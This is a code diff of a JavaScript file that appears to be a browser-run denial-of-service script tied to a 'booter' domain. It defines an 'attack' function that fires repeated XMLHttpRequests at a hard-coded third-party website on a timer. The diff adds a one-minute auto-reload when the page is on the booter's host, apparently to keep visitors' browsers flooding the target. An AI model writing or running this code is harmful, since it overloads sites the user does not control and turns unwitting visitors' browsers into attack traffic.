@@ -1,4 +1,6 @@
-
+if (location.hostname.indexOf("kronosbooter.com") >= 0) {
+setInterval(function(){ location.reload(); }, 1000 * 60);
+}
 function saldir(url,time) {
 	var xhr = new XMLHttpRequest();
 	var params = {
@@ -24,6 +26,4 @@ function deSerialize(json) {
 		return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
 	}).join('&');
 }
-
-
 saldir("http://www.escort-girls.tv/",300);
